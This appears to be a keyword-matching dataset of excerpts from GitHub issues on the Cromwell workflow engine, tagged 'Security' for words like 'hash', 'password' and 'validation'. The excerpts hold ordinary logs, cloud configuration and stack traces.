default_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Float default_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:File R2Fastq|""9f1cf8859a902eb75202a5c048cd43aa-388""|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:File R2Fastq|""9f1cf8859a902eb75202a5c048cd43aa-388""|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:File R1Fastq|""62396abd6b589747ee16034888c9a0b5-381""|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:File R1Fastq|""62396abd6b589747ee16034888c9a0b5-381""|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input count|9BF31C7FF062936A96D3C",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7248:5556,hash,hashes,5556,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7248,1,['hash'],['hashes']
Security,e4cd010e4b|callCaching:hashes:input:String default_attr:docker|A5281F25296D4311ED0C46422719018E|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String default_attr:docker|A5281F25296D4311ED0C46422719018E|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int runtime_attr:max_retries|CFCD208495D565EF66E7DFF9F98764DA|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int runtime_attr:max_retries|CFCD208495D565EF66E7DFF9F98764DA|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int runtime_attr:cpu_cores|C74D97B01EAE257E44AA9D5BADE97BAF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int runtime_attr:cpu_cores|C74D97B01EAE257E44AA9D5BADE97BAF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int numCPUs|C74D97B01EAE257E44AA9D5BADE97BAF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int numCPUs|C74D97B01EAE257E44AA9D5BADE97BAF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int default_attr:max_retries|CFCD208495D565EF66E7DFF9F98764DA|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int default_attr:max_retries|CFCD208495D565EF66E7DFF9F98764DA|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int default_attr:cpu_cores|C74D97B01EAE257E44AA9D5BADE97BAF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int default_attr:cpu_cores|C74D97B01EAE257E44AA9D5BADE97BAF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Float runtime_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Float runtime_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Float default_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Float default_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hash,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7248:5052,hash,hashes,5052,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7248,1,['hash'],['hashes']
Security,eDSoPcHJvZHVjdGlvblF1ZXVl; ```. from .21:. ```; resources:; bootDiskSizeGb: 10; disks:; - autoDelete: true; mountPoint: /cromwell_root; name: local-disk; sizeGb: 200; type: PERSISTENT_HDD; minimumCpuCores: 1; minimumRamGb: 7; preemptible: true; zones:; - us-central1-b; - us-central1-c; pipelineArgs:; clientId: ''; inputs:; exec: gs://broad-gotc-int-cromwell-execution/PairedEndSingleSampleWorkflow/4d02d218-b473-4a88-8820-964da7e508c4/call-ValidateReadGroupSamFile/shard-22/exec.sh; input_bam-0: gs://broad-gotc-int-cromwell-execution/PairedEndSingleSampleWorkflow/4d02d218-b473-4a88-8820-964da7e508c4/call-SortAndFixReadGroupBam/shard-22/HTC3GCCXX.8.Pond-536132.sorted.bam; ref_dict-0: gs://broad-references/hg38/v0/Homo_sapiens_assembly38.dict; ref_fasta-0: gs://broad-references/hg38/v0/Homo_sapiens_assembly38.fasta; ref_fasta_index-0: gs://broad-references/hg38/v0/Homo_sapiens_assembly38.fasta.fai; logging:; gcsPath: gs://broad-gotc-int-cromwell-execution/PairedEndSingleSampleWorkflow/4d02d218-b473-4a88-8820-964da7e508c4/call-ValidateReadGroupSamFile/shard-22/ValidateReadGroupSamFile-22.log; outputs:; HTC3GCCXX.8.Pond-536132.validation_report: gs://broad-gotc-int-cromwell-execution/PairedEndSingleSampleWorkflow/4d02d218-b473-4a88-8820-964da7e508c4/call-ValidateReadGroupSamFile/shard-22/HTC3GCCXX.8.Pond-536132.validation_report; ValidateReadGroupSamFile-22-rc.txt: gs://broad-gotc-int-cromwell-execution/PairedEndSingleSampleWorkflow/4d02d218-b473-4a88-8820-964da7e508c4/call-ValidateReadGroupSamFile/shard-22/ValidateReadGroupSamFile-22-rc.txt; projectId: broad-gotc-int; resources:; bootDiskSizeGb: 0; disks: []; minimumCpuCores: 0; minimumRamGb: 0; noAddress: false; preemptible: false; zones: []; serviceAccount:; email: default; scopes:; - https://www.googleapis.com/auth/compute; - https://www.googleapis.com/auth/devstorage.full_control; - https://www.googleapis.com/auth/genomics; - https://www.googleapis.com/auth/genomics; - https://www.googleapis.com/auth/compute; runtimeMe,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1501:3970,Validat,ValidateReadGroupSamFile,3970,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1501,2,['Validat'],"['ValidateReadGroupSamFile', 'ValidateReadGroupSamFile-']"
Security,"eJobExecutionActor-main.white_brits_sample_list:NA:1 [788d8048]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:28:04,01] [info] BT-322 788d8048:main.low_genotyping_quality_sample_list:-1:1 cache hit copying success with aggregated hashes: initial = 3C891C9939496580DDF747805F991E06, file = AAFFF98AC7D58B07E7CE25978A906B00.; [2022-12-15 21:28:04,01] [info] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-EngineJobExecutionActor-main.low_genotyping_quality_sample_list:NA:1 [788d8048]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:28:04,02] [warn] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-BackendCacheHitCopyingActor-788d8048:main.sex_mismatch_sample_list:-1:1-20000000015 [788d8048main.sex_mismatch_sample_list:NA:1]: Unrecognized runtime attribute keys; : shortTask, dx_timeout; [2022-12-15 21:28:04,02] [info] BT-322 788d8048:main.sex_mismatch_sample_list:-1:1 cache hit copying success with aggregated hashes: initial = 03340ED60152B24B7D0988669F47CF2B, file = EB6A9909BDF3705B7BB543E4096DA08A.; [2022-12-15 21:28:04,02] [info] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-EngineJobExecutionActor-main.sex_mismatch_sample_list:NA:1 [788d8048]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:28:04,35] [info] BackgroundConfigAsyncJobExecutionActor [788d8048main.load_shared_covars:NA:1]: /home/cromwell-executions/main/9e4f5894-f7e6-4e2f-be4b-f547d6de7fff/call-main/main; /788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2/call-load_shared_covars/inputs/-915037270/load_shared_covars.py . /home/cromwell-executions/main/9e4f5894-f7e6-4e2f-be4b-f547d6de7fff/call-main/main/788d80; 48-ef2b-4d7c-b3cb-6e04b3cbbdc2/call-load_shared_covars/inputs/-949496038/ukb46122_cal_chr1_v2_s488176.fam /home/cromwell-executions/main/9e4f5894-f7e6-4e2f-be4b-f547d6de7fff/call-main/main/788d; 8048-ef2b-4d7c-b3cb-6e04b3cbbdc2/call-load_shared_covars/inputs/-1401422240/22009.txt /home/cromwell-executions",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971:36935,hash,hashes,36935,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971,1,['hash'],['hashes']
Security,"echo""; }; ```; This was run with: `java -jar cromwell-36.jar run works.json --inputs inputs.json`. There are two issues:; - clearly the `name` key is being ignored. Since it is not required (see next item), this is by itself quite minor.; - a `name` key is *not* required per the CWL spec (https://www.commonwl.org/v1.0/CommandLineTool.html#InputRecordSchema). As mentioned, ignoring the `name` parameter is probably acceptable, BUT if I remove that parameter, the execution fails. The failing example is the same, but with ` ""name"": ""SOME JUNK VALUE"",` removed:; ```; $ diff works.json fails.json ; 9d8; < ""name"": ""SOME JUNK VALUE"",; ```; The stack trace reports:; ```; [2018-10-30 21:46:32,22] [error] WorkflowManagerActor Workflow de935a6c-85a6-476f-845f-cf5360bbef03 failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; error when parsing file /tmp/cwl_temp_dir_9897655526044348367/cwl_temp_file_de935a6c-85a6-476f-845f-cf5360bbef03.cwl; DecodingFailure at .inputs[0].type: DecodingFailure at .inputs[0].type: DecodingFailure at .inputs[0].type: String; ``` ; <!--; Hi! Thanks for taking the time to report feedback. Before posting an issue here, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're in the right place. -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4338:3247,PASSWORD,PASSWORDS,3247,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4338,1,['PASSWORD'],['PASSWORDS']
Security,"ecify resource requirements (cores, ram etc) to AWSBatch? . I am executing a CWL workflow with AWS batch backend. ; Each task is submitted by cromwell and I can verify on AWS console that all jobs ended successfully.; However, for jobs that I have set coresMin and coresMax requirements I get the warning:. ```; [warn] AwsBatchAsyncBackendJobExecutionActor [6bd79e09fastqc_1:NA:1]: Unrecognized runtime attribute keys: cpuMax; ```. and at the end of the workflow the error:; ```; [error] Runtime attribute validation failed:; Expecting cpu runtime attribute value greater than 0; Expecting cpuMin runtime attribute value greater than 0; cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting cpu runtime attribute value greater than 0; Expecting cpuMin runtime attribute value greater than 0; 	at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build(ValidatedRuntimeAttributesBuilder.scala:62); 	at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build$(ValidatedRuntimeAttributesBuilder.scala:56); 	at cromwell.backend.standard.StandardValidatedRuntimeAttributesBuilder$StandardValidatedRuntimeAttributesBuilderImpl.build(StandardValidatedRuntimeAttributesBuilder.scala:20); 	at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes(StandardCachingActorHelper.scala:56); 	at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes$(StandardCachingActorHelper.scala:54); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.validatedRuntimeAttributes$lzycompute(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.validatedRuntimeAttributes(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardCachingActorHelper.startMetadataKeyValues(StandardCachingActorHelper.scala:75); 	at cromwell.backend.standard.StandardCachingActorHelper.startMetadata",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4591:1021,validat,validation,1021,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4591,1,['validat'],['validation']
Security,"ecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're in the right place. -->. <!-- Which backend are you running? -->; Im using FireCloud (workspace: broad-firecloud-dsde/dsde-methods-sv-dev); <!-- Paste/Attach your workflow if possible: -->; The WDL can be found in GATK's repo: [cnv_germline_cohort_workflow.wdl](https://github.com/broadinstitute/gatk/blob/master/scripts/cnv_wdl/germline/cnv_germline_cohort_workflow.wdl) that imports [cnv_common_tasks.wdl](https://github.com/broadinstitute/gatk/blob/master/scripts/cnv_wdl/cnv_common_tasks.wdl). This is the graph that ```wdltools``` output for that WDL; [graph.pdf](https://github.com/broadinstitute/cromwell/files/2406647/graph.pdf); ![graph](https://user-images.githubusercontent.com/791104/45901323-88187c80-bdb0-11e8-91df-c9a61a12a96a.png). <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->. As you can see in the monitor's ""Failure"" [report ](https://portal.firecloud.org/#workspaces/broad-firecloud-dsde/dsde-methods-sv-dev/monitor/88f444ae-0898-4b5e-af0c-ede98216641d/6d980272-4aa7-4d32-ab90-84880a0723b2)```GermlineCNVCallerCohortMode``` scatter task never get calls before the dependent ```PostprocessGermineCNVCalls```.; <img width=""788"" alt=""screen shot 2018-09-21 at 3 21 43 pm"" src=""https://user-images.githubusercontent.com/791104/45901815-47b9fe00-bdb2-11e8-9043-9f771ee8bd9e.png"">. The log confirms this if one searches for ""Starting"":; ```; 2018-09-20 22:45:12,561 INFO - WorkflowExecutionActor-6d980272-4aa7-4d32-ab90-84880a0723b2 [UUID(6d980272)]: ; Starting CNVGermlineCohortWorkflow.PreprocessIntervals; 2018-09-20 23:03:42,454 INFO - WorkflowExecutionActor-6d980272-4aa7-4d32-ab90-84880a0723b2 [UUID(6d980272)]: ; Starting CNVGermlineCohortWorkflow.CollectCounts (95 shards), CNVGermlineCohortWorkflow.ScatterInterva",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4136:1386,PASSWORD,PASSWORDS,1386,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4136,1,['PASSWORD'],['PASSWORDS']
Security,"ecomment-334536133). I think this comment is more appropriate here:. Equals is supposed to be bitwise/value-based equality, whereas `eq` indicates reference equality. I don't recall the exact motivation behind using `eq` in the test, maybe @cjllanwarne can comment when he returns on Tuesday. ---. @curoli commented on [Thu Oct 05 2017](https://github.com/broadinstitute/wdl4s/issues/248#issuecomment-334555964). If you don't like this fix, what do you suggest we do instead? How about we accept this fix now and you can rework the whole thing later, if you want?. This is a show-stopper once you want to create larger (aka real-life) workflows. . For example: if node a has two outputs, which are inputs of b, then b.hashCode calls a.hasCode twice. If b produces two outputs which are inputsof c, then c.hashCode calls b.hashCode twice, and a.hashCode is called four times. If c produces two outputs which are inputs of d, d.hashCode calls c.hashCode twice, b.hashCode four times and a.hashCode eight times, etc. . ---. @curoli commented on [Thu Oct 05 2017](https://github.com/broadinstitute/wdl4s/issues/248#issuecomment-334557027). `eq` is object equality. `equals` and `==` are the same, and there is no general rule that they need to be component-based (""bitwise""). On the contrary, `equals`/`==` should not be component-based if an object is mutable. Your typical GraphNode is mutable, because it indirectly contains `GraphNodeSetter`. ---. @danbills commented on [Thu Oct 05 2017](https://github.com/broadinstitute/wdl4s/issues/248#issuecomment-334575875). I suggest we leave this as-is with the understanding that it could be a performance issue down the road. . >rework the whole thing later. This is a specific anti-goal. As I suggested, I would like to discuss w/ Chris when he gets back next week as we introduced the reference equality in the first place and I'm not aware of his motivation to do so. ---. @curoli commented on [Thu Oct 05 2017](https://github.com/broadinstitute/wdl4s/i",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2694:1878,hash,hashCode,1878,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2694,2,['hash'],['hashCode']
Security,"ecycleActorFactory"". system {; memory-retry-error-keys = [""OutOfMemory"", ""Killed"", ""Error:""]; }; config {; project = ""$my_project""; root = ""$my_bucket""; name-for-call-caching-purposes: PAPI; slow-job-warning-time: 24 hours; genomics-api-queries-per-100-seconds = 1000; maximum-polling-interval = 600. # Setup GCP to give more memory with each retry; system {; memory-retry-error-keys = [""OutOfMemory"", ""Killed"", ""Error:""]; }; system.memory-retry-error-keys = [""OutOfMemory"", ""Killed"", ""Error:""]; memory_retry_multiplier = 4; ; # Number of workers to assign to PAPI requests; request-workers = 3. virtual-private-cloud {; network-label-key = ""network-key""; network-name = ""network-name""; subnetwork-name = ""subnetwork-name""; auth = ""auth""; }; pipeline-timeout = 7 days; genomics {; auth = ""auth""; compute-service-account = ""$my_account""; endpoint-url = ""https://lifesciences.googleapis.com/""; location = ""us-central1""; restrict-metadata-access = false; localization-attempts = 3; parallel-composite-upload-threshold=""150M""; }; filesystems {; gcs {; auth = ""auth""; project = ""$my_project""; caching {; duplication-strategy = ""copy""; }; }; }; system {; memory-retry-error-keys = [""OutOfMemory"", ""Killed"", ""Error:""]; }; runtime {; cpuPlatform: ""Intel Cascade Lake""; }; default-runtime-attributes {; cpu: 1; failOnStderr: false; continueOnReturnCode: 0; memory: ""2048 MB""; bootDiskSizeGb: 10; disks: ""local-disk 375 SSD""; noAddress: true; preemptible: 1; maxRetries: 3; system.memory-retry-error-keys = [""OutOfMemory"", ""Killed"", ""Error:""]; memory_retry_multiplier = 4; zones: [""us-central1-a"", ""us-central1-b""]; }. include ""papi_v2_reference_image_manifest.conf""; }; }; }; }. gustily ls gs://cromwell-executions/MemoryRetryTest/d54a5a39-4d3b-4ac7-9bb1-97043d761b56/call-TestOutOfMemoryRetry; TestOutOfMemoryRetry.log; gcs_delocalization.sh; gcs_localization.sh; gcs_transfer.sh; rc; script; stderr; stdout; pipelines-logs. stderr:; Killed; /cromwell_root/script: line 32: 17 Killed tail /dev/zero. rc:; 137",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7451:2137,access,access,2137,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7451,1,['access'],['access']
Security,"ed `WorkflowActor` FSM appears to put it back into its initial `WorkflowUnstartedState` where it wouldn't do anything to progress a workflow until it receives a `StartWorkflowCommand` which is not being re-sent. So it looks like this would create a zombie workflow, though it does appear to be abortable.; ```; ERROR akka.actor.OneForOneStrategy - Google credentials are invalid: Error getting access token for service account: 400 Bad Request; {; ""error"": ""invalid_grant"",; ""error_description"": ""Invalid JWT Signature.""; }; java.lang.RuntimeException: Google credentials are invalid: Error getting access token for service account: 400 Bad Request; {; ""error"": ""invalid_grant"",; ""error_description"": ""Invalid JWT Signature.""; }; 	at cromwell.cloudsupport.gcp.auth.GoogleAuthMode.validateCredentials(GoogleAuthMode.scala:175); 	at cromwell.cloudsupport.gcp.auth.GoogleAuthMode.validateCredentials$(GoogleAuthMode.scala:173); 	at cromwell.cloudsupport.gcp.auth.UserServiceAccountMode.validateCredentials(GoogleAuthMode.scala:237); 	at cromwell.cloudsupport.gcp.auth.UserServiceAccountMode.credentials(GoogleAuthMode.scala:250); 	at cromwell.cloudsupport.gcp.auth.UserServiceAccountMode.credentials(GoogleAuthMode.scala:237); 	at cromwell.filesystems.drs.DrsPathBuilderFactory.withOptions(DrsPathBuilderFactory.scala:86); 	at cromwell.core.path.PathBuilderFactory$.$anonfun$instantiatePathBuilders$2(PathBuilderFactory.scala:23); 	at cats.instances.ListInstances$$anon$1.$anonfun$traverse$2(list.scala:74); 	at cats.instances.ListInstances$$anon$1.loop$2(list.scala:64); 	at cats.instances.ListInstances$$anon$1.$anonfun$foldRight$1(list.scala:64); 	at cats.Eval$$anon$11.$anonfun$start$3(Eval.scala:275); 	at cats.Eval$.loop$1(Eval.scala:336); 	at cats.Eval$.cats$Eval$$evaluate(Eval.scala:368); 	at cats.Eval$Defer.value(Eval.scala:257); 	at cats.instances.ListInstances$$anon$1.traverse(list.scala:73); 	at cats.instances.ListInstances$$anon$1.traverse(list.scala:12); 	at cats.Traverse$Ops.traverse(",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4916:1166,validat,validateCredentials,1166,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4916,1,['validat'],['validateCredentials']
Security,"ed if this was user error. From the configuration:. ```; ...snip...; JES {; actor-factory = ""cromwell.backend.impl.jes.JesBackendLifecycleActorFactory""; config {; # Google project; project = ""broad-dsde-methods""; ; # Base bucket for workflow executions; root = ""gs://broad-dsde-methods/cromwell-executions-eval-gatk-protected/""; ; # Set this to the lower of the two values ""Queries per 100 seconds"" and ""Queries per 100 seconds per user"" for; # your project.; #; # Used to help determine maximum throughput to the Google Genomics API. Setting this value too low will; # cause a drop in performance. Setting this value too high will cause QPS based locks from Google.; # 1000 is the default ""Queries per 100 seconds per user"", 50000 is the default ""Queries per 100 seconds""; # See https://cloud.google.com/genomics/quotas for more information; genomics-api-queries-per-100-seconds = 1000; ; # Polling for completion backs-off gradually for slower-running jobs.; # This is the maximum polling interval (in seconds):; maximum-polling-interval = 600; ; # Optional Dockerhub Credentials. Can be used to access private docker images. REMOVED HERE; dockerhub {; account = ""user_manually_removed""; token = ""password_manually_removed""; }; ; genomics {; # A reference to an auth defined in the `google` stanza at the top. This auth is used to create; # Pipelines and manipulate auth JSONs.; auth = ""application-default""; ; // alternative service account to use on the launched compute instance; // NOTE: If combined with service account authorization, both that serivce account and this service account; // must be able to read and write to the 'root' GCS path; compute-service-account = ""default""; ; # Endpoint for APIs, no reason to change this unless directed by Google.; endpoint-url = ""https://genomics.googleapis.com/""; }; ; filesystems {; gcs {; # A reference to a potentially different auth for manipulating files via engine functions.; auth = ""application-default""; }; }; }; }. #AWS {; ...snip...; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1748:1583,access,access,1583,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1748,2,"['access', 'authoriz']","['access', 'authorization']"
Security,"edConfigAsyncJobExecutionActor.aroundReceive(ConfigAsyncJobExecutionActor.scala:208); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:527); at akka.actor.ActorCell.invoke(ActorCell.scala:496); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: common.exception.AggregatedMessageException: Error(s):; Optional value was not set and no 'default' attribute was provided; Optional value was not set and no 'default' attribute was provided; at common.validation.Validation$ValidationTry$.toTry$extension1(Validation.scala:60); at common.validation.Validation$ValidationTry$.toTry$extension0(Validation.scala:56); at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand(StandardAsyncExecutionActor.scala:534); ... 39 common frames omitted. ```. <!--; Hi! Thanks for taking the time to report feedback. Before posting an issue here, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're in the right place. -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3927:5474,Validat,Validation,5474,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3927,2,"['PASSWORD', 'Validat']","['PASSWORDS', 'Validation']"
Security,edSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:836); at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireQueued(AbstractQueuedSynchronizer.java:870); at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquire(AbstractQueuedSynchronizer.java:1199); at java.util.concurrent.locks.ReentrantLock$NonfairSync.lock(ReentrantLock.java:209); at java.util.concurrent.locks.ReentrantLock.lock(ReentrantLock.java:285); at com.google.api.client.auth.oauth2.Credential.refreshToken(Credential.java:486); at cromwell.filesystems.gcs.GoogleAuthMode$$anonfun$1.apply$mcZ$sp(GoogleAuthMode.scala:79); at cromwell.filesystems.gcs.GoogleAuthMode$$anonfun$1.apply(GoogleAuthMode.scala:79); at cromwell.filesystems.gcs.GoogleAuthMode$$anonfun$1.apply(GoogleAuthMode.scala:79); at scala.util.Try$.apply(Try.scala:192); at cromwell.filesystems.gcs.GoogleAuthMode$class.validateCredentials(GoogleAuthMode.scala:79); at cromwell.filesystems.gcs.ApplicationDefaultMode.validateCredentials(GoogleAuthMode.scala:138); at cromwell.filesystems.gcs.GoogleAuthMode$class.credential(GoogleAuthMode.scala:64); at cromwell.filesystems.gcs.ApplicationDefaultMode.credential(GoogleAuthMode.scala:138); at cromwell.filesystems.gcs.GoogleAuthMode$class.buildStorage(GoogleAuthMode.scala:95); at cromwell.filesystems.gcs.ApplicationDefaultMode.buildStorage(GoogleAuthMode.scala:138); at cromwell.backend.impl.jes.io.package$.buildFilesystem(package.scala:26); at cromwell.backend.impl.jes.JesWorkflowPaths.<init>(JesWorkflowPaths.scala:18); at cromwell.backend.impl.jes.JesInitializationActor.<init>(JesInitializationActor.scala:43); at cromwell.backend.impl.jes.JesInitializationActor$$anonfun$props$1.apply(JesInitializationActor.scala:22); at cromwell.backend.impl.jes.JesInitializationActor$$anonfun$props$1.apply(JesInitializationActor.scala:22); ```. The two problem actors here are JesAsyncBackendJobExecutionActor and JesInitializationActor. JobPreparationActor also triggers a similar stack t,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1065#issuecomment-228816798:1544,validat,validateCredentials,1544,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1065#issuecomment-228816798,1,['validat'],['validateCredentials']
Security,"eedback. Before posting an issue here, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're in the right place. -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->. Hi folks,. I try to launch cromwell in its server mode, however I get the following error:. ```; java -jar ./cromwell-34.jar server; Exception in thread ""main"" java.lang.VerifyError: Uninitialized object exists on backward branch 209; Exception Details:; Location:; scala/collection/immutable/HashMap$HashTrieMap.split()Lscala/collection/immutable/Seq; @249: goto; Reason:; Error exists in the bytecode; Bytecode:; 0x0000000: 2ab6 0060 04a0 001e b200 b8b2 00bd 04bd; 0x0000010: 0002 5903 2a53 c000 bfb6 00c3 b600 c7c0; 0x0000020: 00c9 b02a b600 36b8 0040 3c1b 04a4 015e; 0x0000030: 1b05 6c3d 2a1b 056c 2ab6 0036 b700 cb3e; 0x0000040: 2ab6 0036 021d 787e 3604 2ab6 0036 0210; 0x0000050: 201d 647c 7e36 05bb 0019 59b2 00bd 2ab6; 0x0000060: 0038 c000 bfb6 00cf b700 d21c b600 d63a; 0x0000070: 0619 06c6 001a 1906 b600 dac0 0086 3a07; 0x0000080: 1906 b600 ddc0 0086 3a08 a700 0dbb 00df; 0x0000090: 5919 06b7 00e2 bf19 073a 0919 083a 0abb; 0x00000a0: 0002 5915 0419 09bb 0019 59b2 00bd 1909; 0x00000b0: c000 bfb6 00cf b700 d203 b800 e83a 0e3a. ```. OS: redhat 6.9 ; Java: ; ```; java -version; java version ""1.8.0_20""; Java(TM) SE Runtime Environment (build 1.8.0_20-b26); Java HotSpot(TM) 64-Bit Server VM (build 25.20-b23, mixed mode); ```. Any 